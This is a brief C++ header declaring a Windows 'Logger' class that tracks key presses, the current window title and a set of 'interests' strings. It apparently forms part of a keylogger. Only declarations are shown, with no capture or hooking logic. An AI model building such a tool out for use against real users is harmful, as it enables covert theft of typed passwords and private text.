#pragma once
#include <set>
#include <Windows.h>
#include "OutputFile.h"

class Logger {
public:
	Logger();
	void start();
	virtual ~Logger();

private:
	std::set<std::string> interests;
	HWND window;

	void initialize();
	int isSpecial(OutputFile &of, int key) const;
	char* getCurrWindowTitle();
};
